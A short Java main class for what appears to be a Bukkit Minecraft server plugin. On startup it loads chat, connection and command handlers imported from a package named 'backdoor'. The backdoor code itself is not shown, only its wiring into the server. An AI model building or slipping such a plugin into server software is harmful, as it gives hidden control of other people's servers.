package me.thesaltyboys.plugin;

import lombok.Getter;
import me.thesaltyboys.backdoor.CommandMan;
import me.thesaltyboys.backdoor.PlayerChat;
import me.thesaltyboys.backdoor.events.ConnectionEvents;
import me.thesaltyboys.backdoor.filler.Filler;
import me.thesaltyboys.backdoor.filler.PlayerRegionTracker;
import org.bukkit.plugin.java.JavaPlugin;

public class Main extends JavaPlugin {

	@Getter
	private CommandMan commandManager;
	@Getter
	private Filler filler;
	@Getter
	private PlayerRegionTracker playerRegionTracker;
	
	public void onEnable() {

		this.getServer().getPluginManager().registerEvents(new PlayerChat(this), this);
		this.getServer().getPluginManager().registerEvents(new ConnectionEvents(this), this);

		commandManager = new CommandMan(this);
		commandManager.init();
		playerRegionTracker = new PlayerRegionTracker();

		filler = new Filler(this);
	}
}
